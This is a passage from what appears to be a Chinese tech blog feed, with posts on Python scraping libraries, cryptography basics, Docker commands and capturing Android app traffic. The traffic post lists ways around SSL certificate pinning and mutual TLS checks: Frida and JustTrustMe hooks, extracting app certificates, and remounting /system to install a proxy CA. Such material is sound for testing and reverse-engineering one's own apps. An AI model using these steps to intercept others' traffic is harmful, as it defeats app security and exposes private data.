class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./content.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) </span><br><span class="line">html = file.read() </span><br><span class="line">bs = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>) <span class="comment"># 缩进格式</span></span><br><span class="line"><span class="comment"># print(bs.prettify()) # 格式化html结构</span></span><br><span class="line"><span class="comment"># print(bs.title) # 获取title标签的名称</span></span><br><span class="line"><span class="comment"># print(bs.title.name) # 获取title的name</span></span><br><span class="line"><span class="comment"># print(bs.title.string) # 获取head标签的所有内容</span></span><br><span class="line"><span class="comment"># print(bs.head) </span></span><br><span class="line"><span class="comment"># print(bs.div.a)  # 获取第一个div标签中的所有内容</span></span><br><span class="line"><span class="comment"># print(bs.div[&quot;id&quot;]) # 获取第一个div标签的id的值</span></span><br><span class="line"><span class="comment"># print(bs.a) </span></span><br><span class="line"><span class="comment"># print(bs.find_all(&quot;a&quot;)) # 获取所有的a标签</span></span><br><span class="line"><span class="comment"># print(bs.find(id=&quot;u1&quot;)) # 获取id=&quot;u1&quot;</span></span><br><span class="line"><span class="comment"># for item in bs.find_all(&quot;a&quot;): </span></span><br><span class="line"><span class="comment">#     print(item.get(&quot;href&quot;)) # 获取所有的a标签，并遍历打印a标签中的href的值</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> bs.find_all(<span class="string">&quot;a&quot;</span>): </span><br><span class="line">    <span class="built_in">print</span>(item.get_text())</span><br></pre></td></tr></table></figure><h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>lxml 是 Python 的第三方解析库，完全使用 Python 语言编写，它对 Xpath 表达式提供了良好的支持，因此能够了高效地解析 HTML/XML 文档。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install lxml    <span class="comment">#安装模块</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree <span class="comment">#导入模块</span></span><br></pre></td></tr></table></figure><p><strong>提取所有a标签内的文本信息</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://news.sina.com.cn/&quot;</span></span><br><span class="line"></span><br><span class="line">c = requests.get(url)</span><br><span class="line">doc = c.content.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">parse_html=etree.HTML(doc)</span><br><span class="line">xpath_bds=<span class="string">&#x27;//*[@id=&quot;blk_gnxw_011&quot;]/li/a/text()\n&#x27;</span></span><br><span class="line"><span class="comment"># xpath_bds=&#x27;//*[@id=&quot;blk_gnxw_011&quot;]/li/a/@href&#x27;   #获取A标签 href的属性值</span></span><br><span class="line"></span><br><span class="line">r_list=parse_html.xpath(xpath_bds)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r_list)</span><br><span class="line"><span class="built_in">print</span>(r_list[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h2><p>Python urllib 库用于操作网页 URL，并对网页的内容进行抓取处理,默认url不进行编码,requests库默认会对url进行编码,编写工具时需要用这个库.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urllib.request - 打开和读取 URL。</span><br><span class="line">urllib.error - 包含 urllib.request 抛出的异常。</span><br><span class="line">urllib.parse - 解析 URL。</span><br><span class="line">urllib.robotparser - 解析 robots.txt 文件。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">string = <span class="string">&#x27;%E7%88%AC%E8%99%AB&#x27;</span>     </span><br><span class="line">string1 = &#123;<span class="string">&quot;wd&quot;</span>:<span class="string">&#x27;爬虫&#x27;</span>&#125;           <span class="comment"># 这里参数必须是字典</span></span><br><span class="line">result = parse.unquote(string)   <span class="comment">#url解码</span></span><br><span class="line">result1 = parse.urlencode(string1)  <span class="comment">#url编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(result1)</span><br></pre></td></tr></table></figure><h2 id="openpyxl"><a href="#openpyxl" class="headerlink" title="openpyxl"></a>openpyxl</h2><p><strong>引入库</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br></pre></td></tr></table></figure><p><strong>基本操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wb1 = Workbook(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">wb = Workbook()  </span><br><span class="line">wb = load_workbook(<span class="string">&#x27;./000.xlsx&#x27;</span>)   <span class="comment">#加载一个文件.</span></span><br><span class="line">ws1 = wb.create_sheet(<span class="string">&#x27;111&#x27;</span>)       <span class="comment">#设置工作表名</span></span><br></pre></td></tr></table></figure><p><strong>写入数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">table[<span class="string">&#x27;A2&#x27;</span>] = <span class="number">4</span>     <span class="comment">#单元格写入</span></span><br><span class="line">table[<span class="string">&#x27;A1&#x27;</span>] = <span class="string">&#x27;=SUM(1,1)&#x27;</span>    <span class="comment">#按公式写入</span></span><br><span class="line"></span><br><span class="line">table.cell(row = <span class="number">3</span>,column = <span class="number">1</span>,value = <span class="number">10</span>)      <span class="comment">#按行列写入</span></span><br><span class="line">table.cell(row = <span class="number">3</span>,column = <span class="number">1</span>).value = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">row = [<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,]<span class="comment">#写入一行</span></span><br><span class="line">sheet.append(row)                    </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl <span class="comment">#写入</span></span><br><span class="line"><span class="comment">#这个库的行列索引是从1开始的</span></span><br><span class="line">writeBook_in = openpyxl.load_workbook(<span class="string">&#x27;追加.xlsx&#x27;</span>)</span><br><span class="line">writeSheet_in = writeBook_in[<span class="string">&quot;Sheet1&quot;</span>]</span><br><span class="line"></span><br><span class="line">writeRow_in = <span class="number">6</span><span class="comment">#从第6排开始</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):<span class="comment">#循环两次，所以到第7排</span></span><br><span class="line">    </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">2</span>, <span class="string">&#x27;李四&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">3</span>, <span class="string">&#x27;女&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">4</span>, <span class="string">&#x27;55566620121010123456&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">6</span>, <span class="string">&#x27;1-101&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">9</span>, <span class="number">15611112222</span>) </span><br><span class="line">    </span><br><span class="line">    writeRow_in += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">writeBook_in.save(<span class="string">&quot;追加第二版.xlsx&quot;</span>)<span class="comment">#在源文件当前目录新建一个文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>读取数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">f = openpyxl.load_workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)  <span class="comment">#读取一个excel文件</span></span><br><span class="line"><span class="comment">#读取单元格或范围切片</span></span><br><span class="line">c = table[<span class="string">&#x27;A1&#x27;</span>]<span class="comment">#获取&#x27;A1&#x27;，返回class</span></span><br><span class="line">c = table.cell(row = <span class="number">1</span>,column = <span class="number">1</span>)<span class="comment">#按行列数获读取</span></span><br><span class="line"></span><br><span class="line">row5 = table[<span class="number">5</span>]     <span class="comment">#获取第5行，返回元组</span></span><br><span class="line">colA = table[<span class="string">&#x27;C&#x27;</span>]    <span class="comment">#获取C列</span></span><br><span class="line">cell_range = table[<span class="string">&#x27;A1&#x27;</span>:<span class="string">&#x27;B4&#x27;</span>]    <span class="comment">#获取范围切片元组</span></span><br><span class="line">row_range = table[<span class="number">5</span>:<span class="number">8</span>]<span class="comment">#5到8行</span></span><br><span class="line">col_range[<span class="string">&#x27;A:D&#x27;</span>]<span class="comment">#A到D列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#按行列数读取范围切片</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> table.iter_rows(min_row=<span class="number">1</span>, max_col=<span class="number">3</span>, max_row=<span class="number">2</span>):    <span class="comment">#按行读取</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> table.iter_cols(min_row=<span class="number">1</span>, max_col=<span class="number">3</span>, max_row=<span class="number">2</span>):    <span class="comment">#按列读取</span></span><br><span class="line"></span><br><span class="line">table.max_row    <span class="comment">#最大行数</span></span><br><span class="line">table.max_column <span class="comment">#最大列数</span></span><br><span class="line">table.rows     <span class="comment">#按行遍历</span></span><br><span class="line">table.columns    <span class="comment">#按列遍历</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取单元格的值</span></span><br><span class="line">c = table[<span class="string">&#x27;A2&#x27;</span>].value<span class="comment">#按位置读取</span></span><br><span class="line">c = table.cell(row = <span class="number">1</span>,column = <span class="number">1</span>).value<span class="comment">#按行列数读取 </span></span><br></pre></td></tr></table></figure><p><strong>保存</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wb.save(<span class="string">&#x27;sanguo.xlsx&#x27;</span>)  <span class="comment"># 保存文件，注意以xlsx为文件扩展名</span></span><br></pre></td></tr></table></figure><h2 id="系统模块-json"><a href="#系统模块-json" class="headerlink" title="系统模块 json"></a>系统模块 json</h2><p>用于json的解析后在使用jsonpath取提取</p><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>json.dumps()</td><td>将 Python 对象转换成 JSON 字符串。</td></tr><tr><td>json.loads()</td><td>将 JSON 字符串转换成 Python 对象。<strong>引入字符串</strong></td></tr><tr><td>json.dump()</td><td>将 Python 中的对象转化成 JSON 字符串储存到文件中。</td></tr><tr><td>json.load()</td><td>将文件中的 JSON 字符串转化成 Python 对象提取出来。 <strong>加载文件</strong></td></tr></tbody></table><h2 id="JsonPath"><a href="#JsonPath" class="headerlink" title="JsonPath"></a>JsonPath</h2><p>使用例子:必须导入两个库, json,jsonpath,先用json.loads(字符串)转换,再用jsonpath().</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip install jsonpath</span><br><span class="line">pip install json</span><br><span class="line"></span><br><span class="line">response = requests.get(url,headers=headers)<span class="comment">#requests请求JSON内容</span></span><br><span class="line">html = response.text</span><br><span class="line">data = json.loads(html)    <span class="comment">#json.loads把json数据转换成python字典</span></span><br><span class="line"><span class="comment"># 使用 jsonpath 提取数据</span></span><br><span class="line">rjson = jsonpath.jsonpath(data,<span class="string">&#x27;$.data[*].cover&#x27;</span>) <span class="comment">#jsonpath 语句提取</span></span><br><span class="line"><span class="built_in">print</span>(rjson)</span><br></pre></td></tr></table></figure><p>JsonPath语法要点：</p><ul><li><code>$</code> 表示文档的根元素</li><li><code>@</code> 表示文档的当前元素</li><li><code>.node_name</code> 或 <code>[&#39;node_name&#39;]</code> 匹配下级节点</li><li><code>[index]</code> 检索数组中的元素</li><li><code>[start:end:step]</code> 支持数组切片语法</li><li><code>*</code> 作为通配符，匹配所有成员</li><li><code>..</code> 子递归通配符，匹配成员的所有子元素</li><li><code>(&lt;expr&gt;)</code> 使用表达式</li><li><code>?(&lt;boolean expr&gt;)</code>进行数据筛选</li></ul><p>在线语法解析器:<a href="https://www.ivtool.com/jsonpath-parser/">https://www.ivtool.com/jsonpath-parser/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密算法基础</title>
      <link href="/posts/43153/"/>
      <url>/posts/43153/</url>
      
        <content type="html"><![CDATA[<h2 id="补充中"><a href="#补充中" class="headerlink" title="补充中~~"></a>补充中~~</h2><h4 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法:"></a>对称加密算法:</h4><p>加密和解密都使用同一把秘钥，这种加密方法称为对称加密，也称为单密钥加密。<br>简单理解为：加密解密都是同一把钥匙。</p><p><strong>DES:</strong></p><p><strong>DES</strong>是对称性加密里面常见一种，全称为Data Encryption Standard，即数据加密标准，是一种使用密钥加密的块算法。密钥长度是64位(bit)，超过位数密钥被忽略。所谓对称性加密，加密和解密密钥相同。对称性加密一般会按照固定长度，把待加密字符串分成块。不足一整块或者刚好最后有特殊填充字符。往往跨语言做DES加密解密，经常会出现问题。往往是填充方式不对、或者编码不一致、或者选择加密解密模式(ECB,CBC,CTR,OFB,CFB,NCFB,NOFB)没有对应上造成。常见的填充模式有： ‘pkcs5’,’pkcs7’,’iso10126’,’ansix923’,’zero’ 类型，包括DES-ECB,DES-CBC,DES-CTR,DES-OFB,DES-CFB。</p><p><strong>AES:</strong></p><p>AES加密过程涉及到4种操作：字节替代（SubBytes）、行移位（ShiftRows）、列混淆（MixColumns）和轮密钥加（AddRoundKey）。解密过程分别为对应的逆操作。由于每一步操作都是可逆的，按照相反的顺序进行解密即可恢复明文。加解密中每轮的密钥分别由初始密钥扩展得到。算法中16（byte）字节的明文、密文和轮密钥都以一个4x4的矩阵表示。AES的密码必须是16byte。如果文件大小不是16字节的整数倍，那就要在末尾添加一些数据凑够。每个块都会被单独去进行加密。</p><h4 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法:"></a>非对称加密算法:</h4><p>与对称加密算法不同，非对称加密算法需要两个密钥：公钥（publickey）和私钥（privatekey）。公钥<br>与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密；如果用私钥对数据进行加密，那么只有用对应的公钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。<br>简单理解为：加密和解密是不同的钥匙。<br>常见算法：<strong>RSA</strong>、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法）等</p><p><strong>RSA</strong>:</p><ul><li>加密场景，那么肯定希望只有我才能解密，别人只能加密。即<strong>公钥加密，私钥解密。</strong></li><li>签名场景，既然是签名，就希望只能我才能签名，别人只能验证。即<strong>私钥签名，公钥验签</strong></li></ul><h4 id="信息摘要算法"><a href="#信息摘要算法" class="headerlink" title="信息摘要算法:"></a>信息摘要算法:</h4><p>消息摘要算法也被称为哈希（Hash）算法或散列算法。任何消息经过散列函数处理后，都会获得唯一的散列值，这一过程称为 “消息摘要”，其散列值称为 “数字指纹”，其算法自然就是 “消息摘要算法”了,它是一个唯一对应一个消息或文本的固定长度的值，它由一个单向Hash加密函数对消息进行作用而产生。</p><p>常见的算法有<strong>MD5</strong>、<strong>SHA</strong> 和 <strong>MAC</strong>、<strong>CRC</strong> 等</p><h4 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名:"></a>数字签名:</h4><p>数字签名（又称公钥数字签名、电子签章）是一种类似写在纸上的普通的物理签名，但是使用了公钥加密领域的技术实现，用于鉴别数字信息的方法。一套数字签名通常定义两种互补的运算，一个用于签名，另一个用于验证。<br>数字签名，就是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。<br>数字签名，就是对要发送的消息的消息摘要（md5 sha）使用私钥加密后的字符串。<br>数字签名是非对称密钥加密技术与数字摘要技术的综合应用。</p><h4 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书:"></a>数字证书:</h4><p>数字证书就是互联网通讯中标志通讯各方身份信息的一串数字，提供了一种在Internet上验证通信实体身份的方式，它是由权威机构——CA机构，又称为证书授权（Certificate Authority）中心发行的，人们可以在网上用它来识别对方的身份。</p><p><strong>HTTPS(ssl):</strong></p><p>SSL(Secure Sockets Layer 安全套接层)，用以保障在 Internet 上数据传输之安全，利用数据加密(Encryption)技术，可确保数据在网络上之传输过程中不会被截取及窃听。</p><p>TLS（Transport Layer Security 传输层安全），用于在两个通信应用程序之间提供保密性和数据完整性。TLS 是 SSL 的标准化后的产物，有 1.0 ，1.1 ，1.2 三个版本，默认使用 1.0。TLS1.0 和 SSL3.0 几乎没有区别 ，事实上我们现在用的都是 TLS，但因为历史上习惯了 SSL 这个称呼。</p><p>参考:</p><p><a href="https://program-think.blogspot.com/2014/11/https-ssl-tls-2.html">https://program-think.blogspot.com/2014/11/https-ssl-tls-2.html</a></p><p><a href="https://www.kancloud.cn/alex_wsc/java_security/464047">https://www.kancloud.cn/alex_wsc/java_security/464047</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP抓包解决方案,没有抓不到的包</title>
      <link href="/posts/51245/"/>
      <url>/posts/51245/</url>
      
        <content type="html"><![CDATA[<p>编辑中…</p><h2 id="手机抓包"><a href="#手机抓包" class="headerlink" title="手机抓包"></a>手机抓包</h2><p>  优点: 无法对抗,全部能抓,没有抓不到的包.</p><ul><li>手机上抓:Nethunter  可视化抓包.</li></ul><p>​     ①优点:直观,所见即所得</p><p>​     ②缺点:没有内容,粒度太粗,简单看下</p><ul><li>手机上抓:Wireshark  抓包转存.</li></ul><p>​     ①优点:可以转储内容,存下来稍后分析.</p><p>​     ②只能看明文,不能发解加密协议.</p><ul><li>手机上抓:tcpdump  抓包转存.</li></ul><p>​     ①优点:不需要刷Nethunter.</p><p>​     ②缺点:没有界面</p><ul><li><p>电脑+手机:hook  Socket  抓包.</p></li><li><p>电脑+手机:Frida Hook  模拟抓包,改包,重放.</p></li><li><p>电脑+手机:Charles  协议层抓包</p></li></ul><h2 id="hook抓包"><a href="#hook抓包" class="headerlink" title="hook抓包"></a>hook抓包</h2><p>  ①优点:为所欲为,可以对包的内容进行进一步的更改和定制.</p><p>  ②优点:抓包全面,直接就是明文,不需要协议(无需绕过证书绑定)</p><p>  ③缺点:可能会不全,可能会漏.hook点是有限的.万一它在用其它的框架做网络传输就会漏掉.</p><p>工具:okhttplogger-frida</p><h2 id="协议层抓包"><a href="#协议层抓包" class="headerlink" title="协议层抓包"></a>协议层抓包</h2><p>  <strong>Charles + Postern</strong> </p><p>①优点:全面.已经解好了协议,HTTP,WebSocket直接解好.</p><p>②缺点:配置证书稍微麻烦,解不了纯Socket.</p><h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>略………………….</p><h2 id="强制手机所有的流量走vpn-路由"><a href="#强制手机所有的流量走vpn-路由" class="headerlink" title="强制手机所有的流量走vpn(路由)"></a>强制手机所有的流量走vpn(路由)</h2><p>撰写中……………….</p><h2 id="抓不到包的解决方案"><a href="#抓不到包的解决方案" class="headerlink" title="抓不到包的解决方案"></a>抓不到包的解决方案</h2><h4 id="APP不走代理"><a href="#APP不走代理" class="headerlink" title="APP不走代理"></a>APP不走代理</h4><p>打开抓包软件，抓不到包，但APP能正常访问；关闭抓包软件后 APP仍然能正常访</p><p><strong>解决</strong></p><p>ProxyDroid APP 全局代理 强制把IP转发到代理端口上</p><h4 id="APP有做ssl证书校验"><a href="#APP有做ssl证书校验" class="headerlink" title="APP有做ssl证书校验"></a>APP有做ssl证书校验</h4><p>打开抓包软件后 APP不能访问</p><p><strong>解决</strong></p><p>使用justtrustme等Hook 校验代码 让APP 信任代理证书或不做证书校验</p><h4 id="APP有做双向证书校验"><a href="#APP有做双向证书校验" class="headerlink" title="APP有做双向证书校验"></a>APP有做双向证书校验</h4><p>打开抓包软件后 APP不能访问，但抓包软件上会有服务端返回的错误</p><p><strong>解决</strong></p><p>抠出APP里的SSL证书，导入抓包软件中</p><h4 id="APP网络请求混淆"><a href="#APP网络请求混淆" class="headerlink" title="APP网络请求混淆"></a>APP网络请求混淆</h4><p>网络请求库代码有混淆（okhttp HttpURLConnection等等有混淆）打开抓包软件后 APP不能访问</p><p><strong>解决</strong></p><p>方1.使用升级版JustMePlus 自适配Hook混淆后的网络请求库代码（自适配okhttp）</p><p>方2.使用ssl_logger Hook 系统ssl_read ssl_write函数，在手机上抓包，无需配置代理 和安装证书。</p><h4 id="APP走TCP协议"><a href="#APP走TCP协议" class="headerlink" title="APP走TCP协议"></a>APP走TCP协议</h4><p>APP不是发的应用层http协议，使用socket走的是网络层tcp,跟不走代理现象相似，配置好代理后，打开或关闭抓包软件，APP都能正常访问，抓包软件也抓不到包。</p><p><strong>解决</strong></p><p>tcpdump或wireshark抓包 抓tcp包 找线索Hook APP代码 抓到发包和解包的代码处</p><p>发送的数据通常是私有协议，需要逆向解密</p><h4 id="返回数据加密"><a href="#返回数据加密" class="headerlink" title="返回数据加密"></a>返回数据加密</h4><p>能抓到包，但返回数据是乱码,或加密字符串.</p><p><strong>解决:</strong> 找线索Hook APP 找到加解密的代码处</p><p><strong>案例:</strong></p><h2 id="工具的配合用法"><a href="#工具的配合用法" class="headerlink" title="工具的配合用法"></a>工具的配合用法</h2><p>先用Httpcanary抓包，找到该APP发送TCP的IP地址</p><p>再用tcpdump重新在手机上抓包，拷贝到本地电脑上来</p><p>使用wireshark打开该数据包，过滤出目标IP的数据包</p><p>通过抓包tcp包里的可见字符作为线索，反向定位代码，实现Tcp 的Hook抓取</p><h2 id="证书锁定"><a href="#证书锁定" class="headerlink" title="证书锁定"></a>证书锁定</h2><p>客户端关于证书处理的逻辑如下分类:</p><table><thead><tr><th>等级</th><th>策略</th><th>信任范围</th><th>破解方法</th></tr></thead><tbody><tr><td>0</td><td>完全兼容策略</td><td>信任所有证书包括自签发证书</td><td>无需特殊操作</td></tr><tr><td>1</td><td>系统/浏览器默认策略</td><td>信任系统或浏览内置CA证书以及用户安装证书</td><td>设备安装代理证书</td></tr><tr><td>2</td><td>system CA pinning</td><td>只信任系统根证书,不信任用户安装的证书 (android 7.0支持配置network-security-config)</td><td>注入或者root后将用户证书拷贝到系统证书目录</td></tr><tr><td>3</td><td>CA Pinning Root (intermediate) certificate pinning</td><td>信任指定CA颁发的证书</td><td>hook注入等方式篡改锁定逻辑</td></tr><tr><td>4</td><td>Leaf Certificate pinning</td><td>信任指定站点证书</td><td>hook注入等方式篡改锁定逻辑 如遇双向锁定需将app自带证书导入代理软件</td></tr></tbody></table><p><strong>system CA pinning 抓包</strong></p><p>只信任系统根证书,不信任用户安装的证书,我们可以注入或者root后将用户证书拷贝到系统证书目录,下面将的是把用户证书拷贝到系统证书目录的安装方法</p><p>1.导出抓包软件pem证书 *.如果导出cer证书要转换证书为pem格式<br>.pem证书转.cer证书 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -outform der -in demo.pem -out demo.cer </span><br></pre></td></tr></table></figure><p>.cer证书转.pem证书 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in demo.cer -out demo.pem</span><br></pre></td></tr></table></figure><p>将 der 格式的证书转为 pem 证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in cacert.der -out burp.pem </span><br></pre></td></tr></table></figure><p>2.输出证书内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform PEM -subject_hash_old -in xxx.pem </span><br></pre></td></tr></table></figure><p>4.证书改名（第三步输出的第一行为证书名），证书文件名后加一个 .0</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317154731043.png" alt="image-20220317154731043"></p><p>5.adb push 证书到手机 /sdcard/  </p><p>6.进入手机到/sdcard/，su到root用户，执行命令： 更改用户组： chgrp root 证书名 更改文件权限：chmod <strong>644</strong> 证书名   </p><p>7.mv 证书到 /system/etc/security/cacerts/   如果遇到 Read-only file system  执行命令： mount -o rw,remount /system 重新挂在/system目录为可读写 有些手机无法解决 Read-only file system </p><p>8.重启手机 旧版本fiddler生成的证书在手机上可能有问题，用最新版的fiddler 下载并安装证书生成插件 <a href="https://www.telerik.com/fiddler/add-ons">https://www.telerik.com/fiddler/add-ons</a> </p><p><strong>3,4种的对抗解决方案参考:</strong></p><p><a href="https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md">https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md</a></p><p><strong>adb代理</strong></p><p>设置代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global http_proxy ip:port</span><br></pre></td></tr></table></figure><p>关闭代理（无需重启）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global http_proxy :0</span><br></pre></td></tr></table></figure><p>移除代理（需要重启）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings delete global http_proxy</span><br><span class="line">adb shell settings delete global global_http_proxy_host</span><br><span class="line">adb shell settings delete global global_http_proxy_port</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker 基础命令</title>
      <link href="/posts/23136/"/>
      <url>/posts/23136/</url>
      
        <content type="html"><![CDATA[<p>查看镜像</p><p>docker images</p><p>删除镜像</p><p>docker rmi 镜像id前三位</p><p>查看容器</p><p>docker ps -a</p><p>停止容器</p><p>docker stop 容器id前三位</p><p>删除容器</p><p>dockers rm 容器id 前三位</p><p>开启容器</p><p>dockers run -dit -p 物理机端口:容器端口 镜像id的前三位  #-dit 放到后台运行</p><p>进入容器</p><p>docker exec -it 容器id 前三位 /bin/bash</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida hook 打印字符串常用方法</title>
      <link href="/posts/21357/"/>
      <url>/posts/21357/</url>
      
